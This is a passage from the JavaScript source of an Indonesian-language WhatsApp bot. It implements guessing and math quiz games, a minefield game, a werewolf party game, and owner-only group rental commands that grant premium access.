                        tebaktebakan[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
                    });
                    const jawabnyuhbh = result77.jawaban
                    userdb.jawaban = jawabnyuhbh.charAt(0).toLowerCase() + jawabnyuhbh.slice(1);
                    userdb.tebaktebakan = true
                    userdb.game = true
                    console.log("Jawaban: " + result77.jawaban);
                    await sleep(60000);
                    if (userdb.tebaktebakan === false) return
                    if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) {
                        userdb.tebaktebakan = false
                        userdb.game = false
                        zuu.sendText(m.chat, `Waktu Habis\nJawaban: ${userdb.jawaban}`, m);
                        delete tebaktebakan[m.sender.split('@')[0]];
                    }
                } catch (e) {
                    reply(util.format(e))
                }
                break



            case "tebakkimia":
                if (userdb.tebakkimia === true) return reply("Ada soal yang belum terjawab.");
                let anucro = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json');

                let resultkon = anucro[Math.floor(Math.random() * anucro.length)];

                zuu.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nUnsur : ${resultkon.unsur}\nWaktu : 60s`, m).then(() => {
                    tebakkimia[m.sender.split('@')[0]] = resultkon.lambang.toLowerCase();
                });
                const jawabnyuhbhvv = resultkon.lambang
                userdb.jawaban = jawabnyuhbhvv.charAt(0).toLowerCase() + jawabnyuhbhvv.slice(1);
                userdb.tebakkimia = true
                userdb.game = true
                console.log("Jawaban: " + resultkon.lambang);
                await sleep(60000);
                if (userdb.tebakkimia === false) return
                if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) {
                    userdb.tebakkimia = false
                    userdb.game = false
                    zuu.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkimia[m.sender.split('@')[0]]}`, m);
                    delete tebakkimia[m.sender.split('@')[0]];
                }
                break

            case "tebaktekateki":
                if (userdb.tebaktekateki === true) return reply("Ada soal yang belum terjawab.");

                let anukontolid = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json');
                let resultkontil = anukontolid[Math.floor(Math.random() * anukontolid.length)];
                zuu.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${resultkontil.soal}\nWaktu : 60s`, m).then(() => {
                    tebaktekateki[m.sender.split('@')[0]] = resultkontil.jawaban.toLowerCase();
                });
                const jawabnyuhbhvvvv = resultkontil.jawaban
                userdb.jawaban = jawabnyuhbhvvvv.charAt(0).toLowerCase() + jawabnyuhbhvvvv.slice(1);
                userdb.tebaktekateki = true
                userdb.game = true
                console.log("Jawaban: " + resultkontil.jawaban);
                await sleep(60000);
                if (userdb.tebaktekateki === false) return
                if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0])) {
                    userdb.tebaktekateki = false
                    userdb.game = false
                    zuu.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaktekateki[m.sender.split('@')[0]]}`, m);
                    delete tebaktekateki[m.sender.split('@')[0]];
                }
                break

            case "tebaksusunkata":
                if (userdb.tebaksusunkata === true) return reply("Ada soal yang belum terjawab.");
                let anu018 = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json');
                let result01012 = anu018[Math.floor(Math.random() * anu018.length)];
                zuu.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result01012.soal}\nTipe : ${result01012.tipe}\nWaktu : 60s`, m).then(() => {
                    tebaksusunkata[m.sender.split('@')[0]] = result01012.jawaban.toLowerCase();
                });
                const jawabnyuhbhvvvvc = result01012.jawaban
                userdb.jawaban = jawabnyuhbhvvvvc
                userdb.tebaksusunkata = true
                userdb.game = true
                console.log("Jawaban: " + result01012.jawaban);
                await sleep(60000);
                if (userdb.tebbaksusunkata === false) return
                if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0])) {
                    userdb.tebbaksusunkata = false
                    userdb.game = false
                    zuu.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaksusunkata[m.sender.split('@')[0]]}`, m);
                    delete tebaksusunkata[m.sender.split('@')[0]];
                }
                break

            case "tebaksiapaaku":
                if (userdb.tebaksiapaaku === true) return reply("Ada soal yang belum terjawab.");
                let anufujo0 = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json');
                let resultanaka = anufujo0[Math.floor(Math.random() * anufujo0.length)];
                zuu.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${resultanaka.soal}\nWaktu : 60s`, m).then(() => {
                    tebaksiapakahaku[m.sender.split('@')[0]] = resultanaka.jawaban.toLowerCase();
                });
                const jawabnyuhbhvvvvc0 = resultanaka.jawaban
                userdb.jawaban = jawabnyuhbhvvvvc0.charAt(0).toLowerCase() + jawabnyuhbhvvvvc0.slice(1);
                userdb.tebaksiapaaku = true
                userdb.game = true
                console.log("Jawaban: " + resultanaka.jawaban);
                await sleep(60000);
                if (userdb.tebaksiapaaku === false) return
                if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0])) {
                    userdb.tebaksiapaaku = false
                    userdb.game = false
                    zuu.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaksiapakahaku[m.sender.split('@')[0]]}`, m);
                    delete tebaksiapakahaku[m.sender.split('@')[0]];
                }
                break

            case "tebakasahotak":
                if (userdb.tebakasahotak === true) return reply("Ada soal yang belum terjawab.");
                let anuxxx1 = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/asahotak.json');
                let resultomeg1 = anuxxx1[Math.floor(Math.random() * anuxxx1.length)];
                zuu.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${resultomeg1.soal}\nWaktu : 60s`, m).then(() => {
                    tebakasahotak[m.sender.split('@')[0]] = resultomeg1.jawaban.toLowerCase();
                });
                const jawabnyuhbhvvvvc00 = resultomeg1.jawaban
                userdb.jawaban = jawabnyuhbhvvvvc00.charAt(0).toLowerCase() + jawabnyuhbhvvvvc00.slice(1);
                userdb.tebakasahotak = true
                userdb.game = true
                console.log("Jawaban: " + resultomeg1.jawaban);
                await sleep(60000);
                if (userdb.tebakasahotak === false) return
                if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) {
                    userdb.tebakasahotak = false
                    userdb.game = false
                    zuu.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakasahotak[m.sender.split('@')[0]]}`, m);
                    delete tebakasahotak[m.sender.split('@')[0]];
                }
                break
            case 'kuismath':
            case 'math': {
                if (userdb.kuismath === true) return reply("Ada soal yang belum terjawab.");
                let {
                    genMath,
                    modes
                } = require('./lib/importe/game/math.js')
                if (!text) return reply(`Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`)
                let resultmathjs = await genMath(text.toLowerCase())
                zuu.sendText(m.chat, `*Berapa hasil dari: ${resultmathjs.soal.toLowerCase()}*?\n\nWaktu: 20 detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = resultmathjs.jawaban
                })
                console.log("Jawaban: " + resultmathjs.jawaban)
                userdb.jawaban = `${resultmathjs.jawaban}`
                userdb.kuismath = true
                await sleep(20000)
                if (userdb.kuismath === false) return
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    userdb.kuismath = false
                    reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break


            case 'petakbom':
                if (userdb.petakbom === true) return reply("masih ada session")
                if (m.sender in this.petakbom) {
                    return reply(`Game mu masih belum terselesaikan, lanjutkan yukk\n\n${this.petakbom[m.sender].board.join("")}\n\nKirim ${prefix}delpetakbom untuk menghapus game petak bom`);
                }

                function shuffle(array) {
                    return array.sort(() => Math.random() - 0.5);
                }

                this.petakbom[m.sender] = {
                    petak: shuffle([0, 0, 0, 2, 0, 2, 0, 2, 0, 0]),
                    board: ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"],
                    bomb: 3,
                    lolos: 7,
                    pick: 0,
                    nyawa: ["❤️", "❤️"]
                };
                userdb.petakbom = true
                await reply(`*PETAK BOM*\n\n${this.petakbom[m.sender].board.join("")}\n\nPilih lah nomor tersebut! dan jangan sampai terkena Bom!\nBomb : ${this.petakbom[m.sender].bomb}\nNyawa : ${this.petakbom[m.sender].nyawa.join("")}`);
                break;

            case 'delpetakbom':
                if (userdb.petakbom === false) return reply(`Kamu sedang tidak bermain petakbom!`);
                delete this.petakbom[m.sender];
                userdb.petakbom = false
                reply(`Permainan petakbom telah diakhiri.`);
                break;

            case 'caklontong':
                if (userdb.caklontong === true) return reply("Jawab dulu yang tadi")
                let anucaklontong = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                let fetchcaklont = anucaklontong[Math.floor(Math.random() * anucaklontong.length)]
                userdb.game = true
                zuu.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n*${fetchcaklont.soal}*\nWaktu : 2 menit`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = fetchcaklont.jawaban.toLowerCase()
                    caklontong_desk[m.sender.split('@')[0]] = fetchcaklont.deskripsi
                })
                console.log("Jawaban: " + fetchcaklont.jawaban)
                userdb.caklontong = true
                userdb.jawaban = fetchcaklont.jawaban.toLowerCase()
                await sleep(60000)
                if (userdb.caklontong === false) return
                if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    userdb.game = false
                    zuu.sendMessage(m.chat, {
                        text: `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik .caklontong`
                    }, {
                        quoted: fsaluran
                    })
                    delete caklontong[m.sender.split('@')[0]]
                    delete caklontong_desk[m.sender.split('@')[0]]
                }

                break;
            case 'afk': {
                userdb.afkTime = +new Date
                userdb.afkReason = text
                reply(`${pushname}... Telah Afk Dengan Alasan ${text ? ': ' + text : ''}`)
            }
            break
            
case 'premall':
case 'addsewa': {
    if (!isCreator) return reply('Hanya untuk Owner');

    if (/premall/.test(command)) {
        await addAllMembersToPremium(m.chat);
        return reply('*`[ S Y S T E M ]`*\n\nSemua anggota grup telah diberikan akses premium.');
    }

    if (/addsewa/.test(command)) {
        if (!isGroup) {
            const rex1 = /chat.whatsapp.com\/([\w\d]*)/g;
            let linkGc = q.split(" ")[0];
            let second = q.split(" ")[1];
            let code = linkGc.match(rex1);

            if (code === null) return m.reply("No invite URL detected.");

            let kode = code[0].replace("chat.whatsapp.com/", "");
            await zuu.groupAcceptInvite(kode);

            let groupInfo = await zuu.groupGetInviteInfo(kode).catch(async () => {
                return m.reply("Invalid invite URL.");
            });

            if (!groupInfo) return;

            const { id, subject } = groupInfo;

            zuu.sendMessage(m.chat, {
                text: '*`[ S Y S T E M ]`*\nBerhasil Add Sewa ke group\nSemua anggota grup telah diberikan akses premium, termasuk yang baru bergabung.'
            }, { quoted: fsaluran });

            await addAllMembersToPremium(id);
            chatdb.issewa = true;
            _sewa.addSewaGroup(id, subject, linkGc, second, sewa);

        } else if (isGroup) {
            if (!q) return m.reply("Masukkan angka 1m/1d/1h");

            let yeh;
            if (isBotAdmins) {
                let linkGc = await zuu.groupInviteCode(m.chat);
                yeh = `https://chat.whatsapp.com/${linkGc}`;
            } else {
                return m.reply(yeh);
            }

            await addAllMembersToPremium(m.chat);
            chatdb.issewa = true;
            _sewa.addSewaGroup(m.chat, groupName, yeh, q, sewa);

            zuu.sendMessage(m.chat, {
                text: '*`[ S Y S T E M ]`*\nBerhasil Add Sewa ke group\nSemua anggota grup telah diberikan akses premium, termasuk yang baru bergabung.'
            }, { quoted: fsaluran });
        }
    }
}
break;

case 'listsewa': {
    let ordernye = `*${X}[ List Sewa ]${X}*\nJumlah : ${sewa.length}\n\n`;
    for (let i of sewa) {
        let cekvipp = toms(i.expired - Date.now());
        ordernye += `Group : ${i.group}\nID : ${i.id}\nExpired : ${cekvipp.days} hari ${cekvipp.hours} jam ${cekvipp.minutes} menit ${cekvipp.seconds} detik\nLink : ${i.linkgc}\n\n`;
    }
    ordernye += `© - ${botname}`;
    reply(ordernye);
}
break;

case "sewabot": 
reply(listsewa)
break

case 'ceksewa':
case 'sewacek': {
    if (!isGroup) return;
    if (!isSewagc) return reply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`);

    let cekid = toms(_sewa.getSewaExpired(m.chat, sewa) - Date.now());
    let sewenye = `*${X}[ SEWA EXPIRE ]${X}*\n\n*Group*: ${groupName}\n*ID*: ${m.chat}\n*EXPIRE :* ${cekid.days} Hari, ${cekid.hours} Jam, ${cekid.minutes} Menit, ${cekid.seconds} Detik`;

    reply(sewenye);
}
break;

case "delsewa":
if (!isGroup) return reply("Harus berada di group")
if (!isSewagc) return reply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`);

const delSewaGroup = (gid, _dir) => {
    const position = getSewaPosition(gid, _dir);
    
    if (position !== -1) {
        _dir.splice(position, 1);
        fs.writeFileSync('./lib/database/sewa.json', JSON.stringify(_dir));
        return true; 
    }
   
    return false;
};
const jsowjwb = JSON.parse(fs.readFileSync('./lib/database/sewa.json'));
const hsijw = await delSewaGroup(m.chat, jsowjwb)
if (hsijw === true) {
reply("Maaf Sewa Bot Telah di hentikan")
zuu.groupLeave(m.chat)
} else {
reply("Bot Tidak di sewa di gc ini")
}
break


            case 'wwpc':
            case 'ww':
            case 'werewolf': {
                let jimp = require("jimp")
                const resize = async (image, width, height) => {
                    const read = await jimp.read(image);
                    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
                    return data;
                };

                let {
                    emoji_role,
                    sesi,
                    playerOnGame,
                    playerOnRoom,
                    playerExit,
                    dataPlayer,
                    dataPlayerById,
                    getPlayerById,
                    getPlayerById2,
                    killWerewolf,
                    killww,
                    dreamySeer,
                    sorcerer,
                    protectGuardian,
                    roleShuffle,
                    roleChanger,
                    roleAmount,
                    roleGenerator,
                    addTimer,
                    startGame,
                    playerHidup,
                    playerMati,
                    vote,
                    voteResult,
                    clearAllVote,
                    getWinner,
                    win,
                    pagi,
                    malam,
                    skill,
                    voteStart,
                    voteDone,
                    voting,
                    run,
                    run_vote,
                    run_malam,
                    runprefixagi
                } = require('./lib/importe/game/werewolf.js')

                // [ Thumbnail ] 
                let thumb =
                    "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

                const {
                    sender,
                    chat
                } = m;
                zuu.werewolf = zuu.werewolf ? zuu.werewolf : {};
                const ww = zuu.werewolf ? zuu.werewolf : {};
                const data = ww[chat];
                const value = args[0];
                const target = args[1];
                let byId = getPlayerById2(sender, parseInt(target), ww);
                // [ Membuat Room ]
                if (value === "create") {
                    if (chat in ww) return reply("Group masih dalam sesi permainan");
                    if (playerOnGame(sender, ww) === true)
                        return reply("Kamu masih dalam sesi game");
                    ww[chat] = {
                        room: chat,
                        owner: sender,
                        status: false,
                        iswin: null,
                        cooldown: null,
                        day: 0,
                        time: "malem",
                        player: [],
                        dead: [],
                        voting: false,
                        seer: false,
                        guardian: [],
                    };
                    await reply("Room berhasil dibuat, ketik *.ww join* untuk bergabung");

                    // [ Join sesi permainan ]
                } else if (value === "join") {
                    if (!ww[chat]) return reply("Belum ada sesi permainan");
                    if (ww[chat].status === true)
                        return reply("Sesi permainan sudah dimulai");
                    if (ww[chat].player.length > 16)
                        return reply("Maaf jumlah player telah penuh");
                    if (playerOnRoom(sender, chat, ww) === true)
                        return reply("Kamu sudah join dalam room ini");
                    if (playerOnGame(sender, ww) === true)
                        return reply("Kamu masih dalam sesi game");
                    let data = {
                        id: sender,
                        number: ww[chat].player.length + 1,
                        sesi: chat,
                        status: false,
                        role: false,
                        effect: [],
                        vote: 0,
                        isdead: false,
                        isvote: false,
                    };
                    ww[chat].player.push(data);
                    let player = [];
                    let text = `\n*W E R E W O L F - P L A Y E R*\n\n`;
                    for (let i = 0; i < ww[chat].player.length; i++) {
                        text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )}\n`;
                        player.push(ww[chat].player[i].id);
                    }
                    text += "\nJumlah player minimal adalah 5 dan maximal 15";
                    zuu.sendMessage(
                        m.chat, {
                            text: text.trim(),
                            contextInfo: {
                                externalAdReply: {
                                    title: "W E R E W O L F",
                                    mediaType: 1,
                                    renderLargerThumbnail: true,
                                    thumbnail: await resize(thumb, 300, 175),
                                    sourceUrl: "https://whatsapp.com/channel/0029Va9scP6CxoAqmRtHG73T",
                                    mediaUrl: thumb,
                                },
                                mentionedJid: player,
                            },
                        }, {
                            quoted: fsaluran
                        }
                    );

                    // [ Game Play ]
                } else if (value === "start") {
                    if (!ww[chat]) return reply("Belum ada sesi permainan");
                    if (ww[chat].player.length === 0)
                        return reply("Room belum memiliki player");
                    if (ww[chat].player.length < 5)
                        return reply("Maaf jumlah player belum memenuhi syarat");
                    if (playerOnRoom(sender, chat, ww) === false)
                        return reply("Kamu belum join dalam room ini");
                    if (ww[chat].cooldown > 0) {
                        if (ww[chat].time === "voting") {
                            clearAllVote(chat, ww);
                            addTimer(chat, ww);
                            return await run_vote(zuu.chat, ww);
                        } else if (ww[chat].time === "malem") {
                            clearAllVote(chat, ww);
                            addTimer(chat, ww);
                            return await run_malam(zuu.chat, ww);
                        } else if (ww[chat].time === "pagi") {
                            clearAllVote(chat, ww);
                            addTimer(chat, ww);
                            return await runprefixagi(zuu.chat, ww);
                        }
                    }
                    if (ww[chat].status === true)
                        return reply("Sesi permainan telah dimulai");
                    if (ww[chat].owner !== sender)
                        return reply(
                            `Hanya @${ww[chat].owner.split("@")[0]} yang dapat memulai permainan`
                        );
                    let list1 = "";
                    let list2 = "";
                    let player = [];
                    roleGenerator(chat, ww);
                    addTimer(chat, ww);
                    startGame(chat, ww);
                    for (let i = 0; i < ww[chat].player.length; i++) {
                        list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")}\n`;
                        player.push(ww[chat].player[i].id);
                    }
                    for (let i = 0; i < ww[chat].player.length; i++) {
                        list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")} ${
          ww[chat].player[i].role === "werewolf" ||
          ww[chat].player[i].role === "sorcerer"
            ? `[${ww[chat].player[i].role}]`
            : ""
        }\n`;
                        player.push(ww[chat].player[i].id);
                    }
                    for (let i = 0; i < ww[chat].player.length; i++) {
                        // [ Werewolf ]
                        if (ww[chat].player[i].role === "werewolf") {
                            if (ww[chat].player[i].isdead != true) {
                                var textt = `Hai ${zuu.getName(
              ww[chat].player[i].id
            )}, Kamu telah dipilih untuk memerankan *Werewolf* ${emoji_role(
              "werewolf"
            )} pada permainan kali ini, silahkan pilih salah satu player yang ingin kamu makan pada malam hari ini\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc kill nomor* untuk membunuh player`;
                                await zuu.sendMessage(ww[chat].player[i].id, {
                                    text: textt,
                                    mentions: player,
                                });
                            }
                            // [ villager ]
                        } else if (ww[chat].player[i].role === "warga") {
                            if (ww[chat].player[i].isdead != true) {
                                let texttt = `*W E R E W O L F - G A M E*\n\nHai ${zuu.getName(
              ww[chat].player[i].id
            )} Peran kamu adalah *Warga Desa* ${emoji_role(
              "warga"
            )}, tetap waspada, mungkin *Werewolf* akan memakanmu malam ini, silakan masuk kerumah masing masing.\n*LIST PLAYER*:\n${list1}`;
                                await zuu.sendMessage(ww[chat].player[i].id, {
                                    text: texttt,
                                    mentions: player,
                                });
                            }

                            // [ Penerawangan ]
                        } else if (ww[chat].player[i].role === "seer") {
                            if (ww[chat].player[i].isdead != true) {
                                let texxt = `Hai ${zuu.getName(
              ww[chat].player[i].id
            )} Kamu telah terpilih  untuk menjadi *Penerawang* ${emoji_role(
              "seer"
            )}. Dengan sihir yang kamu punya, kamu bisa mengetahui peran pemain pilihanmu.\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc dreamy nomor* untuk melihat role player`;

                                await zuu.sendMessage(ww[chat].player[i].id, {
                                    text: texxt,
                                    mentions: player,
                                });
                            }

                            // [ Guardian ]
                        } else if (ww[chat].player[i].role === "guardian") {
                            if (ww[chat].player[i].isdead != true) {
                                let teext = `Hai ${zuu.getName(
              ww[chat].player[i].id
            )} Kamu terpilih untuk memerankan *Malaikat Pelindung* ${emoji_role(
              "guardian"
            )}, dengan kekuatan yang kamu miliki, kamu bisa melindungi para warga, silahkan pilih salah 1 player yang ingin kamu lindungi\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc deff nomor* untuk melindungi player`;

                                await zuu.sendMessage(ww[chat].player[i].id, {
                                    text: teext,
                                    mentions: player,
                                });
                            }

                            // [ Sorcerer ]
                        } else if (ww[chat].player[i].role === "sorcerer") {
                            if (ww[chat].player[i].isdead != true) {
                                let textu = `Hai ${zuu.getName(
              ww[chat].player[i].id
            )} Kamu terpilih sebagai Penyihir ${emoji_role(
              "sorcerer"
            )}, dengan kekuasaan yang kamu punya, kamu bisa membuka identitas para player, silakan pilih 1 orang yang ingin kamu buka identitasnya\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc sorcerer nomor* untuk melihat role player`;

                                await zuu.sendMessage(ww[chat].player[i].id, {
                                    text: textu,
                                    mentions: player,
                                });
                            }
                        }
                    }
                    await zuu.sendMessage(m.chat, {
                        text: "*W E R E W O L F - G A M E*\n\nGame telah dimulai, para player akan memerankan perannya masing masing, silahkan cek chat pribadi untuk melihat role kalian. Berhati-hatilah para warga, mungkin malam ini adalah malah terakhir untukmu",
                        contextInfo: {
                            externalAdReply: {
                                title: "W E R E W O L F",
                                mediaType: 1,
                                renderLargerThumbnail: true,
                                thumbnail: await resize(thumb, 300, 175),
                                sourceUrl: "https://whatsapp.com/channel/0029Va9scP6CxoAqmRtHG73T",
                                mediaUrl: thumb,
                            },
                            mentionedJid: player,
                        },
                    });
                    await run(zuu.chat, ww);
                } else if (value === "kill") {
                    if (dataPlayer(sender, ww).role !== "werewolf")
                        return reply("Peran ini bukan untuk kamu");
                    if (byId.db.role === "sorcerer")
                        return reply("Tidak bisa menggunakan skill untuk teman");
                    if (playerOnGame(sender, ww) === false)
                        return reply("Kamu tidak dalam sesi game")
                    if (dataPlayer(sender, ww).status === true)
                        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
                    if (dataPlayer(sender, ww).isdead === true)
                        return reply("Kamu sudah mati")
                    if (!target || target.length < 1 || target.split('').length > 2)
                        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
                    if (isNaN(target))
                        return reply("Gunakan hanya nomor")
                    let byId = getPlayerById2(sender, parseInt(target), ww)
                    if (byId.db.isdead === true)
                        return reply("Player sudah mati")
                    if (byId.db.id === sender)
                        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
                    if (byId === false)
                        return reply("Player tidak terdaftar")
                    reply("Berhasil membunuh player " + parseInt(target))
                        .then(() => {
                            dataPlayer(sender, ww).status = true;
                            killWerewolf(sender, parseInt(target), ww);
                        });
                } else if (value === "dreamy") {
                    if (dataPlayer(sender, ww).role !== "seer")
                        return reply("Peran ini bukan untuk kamu");
                    if (playerOnGame(sender, ww) === false)
                        return reply("Kamu tidak dalam sesi game")
                    if (dataPlayer(sender, ww).status === true)
                        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
                    if (dataPlayer(sender, ww).isdead === true)
                        return reply("Kamu sudah mati")
                    if (!target || target.length < 1 || target.split('').length > 2)
                        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
                    if (isNaN(target))
                        return reply("Gunakan hanya nomor")
                    let byId = getPlayerById2(sender, parseInt(target), ww)
                    if (byId.db.isdead === true)
                        return reply("Player sudah mati")
                    if (byId.db.id === sender)
                        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
                    if (byId === false)
                        return reply("Player tidak terdaftar")
                    let dreamy = dreamySeer(m.sender, parseInt(target), ww);
                    reply(`Berhasil membuka identitas player ${target} adalah ${dreamy}`)
                        .then(() => {
                            dataPlayer(sender, ww).status = true;
                        });
                } else if (value === "deff") {
                    if (dataPlayer(sender, ww).role !== "guardian")
                        return reply("Peran ini bukan untuk kamu");
                    if (playerOnGame(sender, ww) === false)
                        return reply("Kamu tidak dalam sesi game")
                    if (dataPlayer(sender, ww).status === true)
                        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
                    if (dataPlayer(sender, ww).isdead === true)
                        return reply("Kamu sudah mati")
                    if (!target || target.length < 1 || target.split('').length > 2)
                        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
                    if (isNaN(target))
                        return reply("Gunakan hanya nomor")
                    let byId = getPlayerById2(sender, parseInt(target), ww)
                    if (byId.db.isdead === true)
                        return reply("Player sudah mati")
                    if (byId.db.id === sender)
                        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
                    if (byId === false)
                        return reply("Player tidak terdaftar")
                    reply(`Berhasil melindungi player ${target}`).then(() => {
                        protectGuardian(m.sender, parseInt(target), ww);
                        dataPlayer(sender, ww).status = true;
                    });
                } else if (value === "sorcerer") {
                    if (dataPlayer(sender, ww).role !== "sorcerer")
                        return reply("Peran ini bukan untuk kamu");
                    if (playerOnGame(sender, ww) === false)
                        return reply("Kamu tidak dalam sesi game")
                    if (dataPlayer(sender, ww).status === true)
                        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
                    if (dataPlayer(sender, ww).isdead === true)
                        return reply("Kamu sudah mati")
                    if (!target || target.length < 1 || target.split('').length > 2)
                        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
                    if (isNaN(target))
                        return reply("Gunakan hanya nomor")
                    let byId = getPlayerById2(sender, parseInt(target), ww)
                    if (byId.db.isdead === true)
                        return reply("Player sudah mati")
                    if (byId.db.id === sender)
                        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
                    if (byId === false)
                        return reply("Player tidak terdaftar")
                    let sorker = sorcerer(sesi(m.sender), target);
                    reply(`Berhasil membuka identitas player ${player} adalah ${sorker}`)
                        .then(() => {
                            dataPlayer(sender, ww).status = true;
                        });
                } else if (value === "vote") {
                    if (!ww[chat]) return reply("Belum ada sesi permainan");
                    if (ww[chat].status === false)
                        return reply("Sesi permainan belum dimulai");
                    if (ww[chat].time !== "voting")
                        return reply("Sesi voting belum dimulai");
                    if (playerOnRoom(sender, chat, ww) === false)
                        return reply("Kamu bukan player");
                    if (dataPlayer(sender, ww).isdead === true)
                        return reply("Kamu sudah mati");
                    if (!target || target.length < 1)
                        return reply("Masukan nomor player");
                    if (isNaN(target)) return reply("Gunakan hanya nomor");
                    if (dataPlayer(sender, ww).isvote === true)
                        return reply("Kamu sudah melakukan voting");
                    b = getPlayerById(chat, sender, parseInt(target), ww);
                    if (b.db.isdead === true)
                        return reply(`Player ${target} sudah mati.`);
                    if (ww[chat].player.length < parseInt(target))
                        return reply("Invalid");
                    if (getPlayerById(chat, sender, parseInt(target), ww) === false)
                        return reply("Player tidak terdaftar!");
                    vote(chat, parseInt(target), sender, ww);
                    return reply("✅ Vote");
                } else if (value == "exit") {
                    if (!ww[chat]) return reply("Tidak ada sesi permainan");
                    if (playerOnRoom(sender, chat, ww) === false)
                        return reply("Kamu tidak dalam sesi permainan");
                    if (ww[chat].status === true)
                        return reply("Permainan sudah dimulai, kamu tidak bisa keluar");
                    let exitww = `${sender.split("@")[0]} Keluar dari permainan`
                    zuu.sendMessage(
                        m.chat, {
                            text: exitww,
                            contextInfo: {
                                externalAdReply: {
                                    title: "W E R E W O L F",
                                    mediaType: 1,
                                    renderLargerThumbnail: true,
                                    thumbnail: await resize(thumb, 300, 175),
                                    sourceUrl: "https://whatsapp.com/channel/0029Va9scP6CxoAqmRtHG73T",
                                    mediaUrl: thumb,
                                },
                                mentionedJid: sender,
                            },
                        }, {
                            quoted: fsaluran
                        }
                    );
                    playerExit(chat, sender, ww);
                } else if (value === "delete") {
                    if (!ww[chat]) return reply("Tidak ada sesi permainan");
                    if (ww[chat].owner !== sender)
                        return reply(
                            `Hanya @${
            ww[chat].owner.split("@")[0]
          } yang dapat menghapus sesi permainan ini`
                        );
                    reply("Sesi permainan berhasil dihapus").then(() => {
                        delete ww[chat];
                    });
                } else if (value === "player") {
                    if (!ww[chat]) return reply("Tidak ada sesi permainan");
                    if (playerOnRoom(sender, chat, ww) === false)
                        return reply("Kamu tidak dalam sesi permainan");
                    if (ww[chat].player.length === 0)
                        return reply("Sesi permainan belum memiliki player");
                    let player = [];
                    let text = "\n*W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
                    for (let i = 0; i < ww[chat].player.length; i++) {
                        text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )} ${
          ww[chat].player[i].isdead === true
            ? `☠️ ${ww[chat].player[i].role}`
            : ""
        }\n`;
                        player.push(ww[chat].player[i].id);
                    }
                    zuu.sendMessage(
                        m.chat, {
                            text: text,
                            contextInfo: {
                                externalAdReply: {
                                    title: "W E R E W O L F",
                                    mediaType: 1,
                                    renderLargerThumbnail: true,
                                    thumbnail: await resize(thumb, 300, 175),
                                    sourceUrl: "https://whatsapp.com/channel/0029Va9scP6CxoAqmRtHG73T",
                                    mediaUrl: thumb,
                                },
                                mentionedJid: player,
                            },
                        }, {
                            quoted: fsaluran
                        }
                    );
                } else {
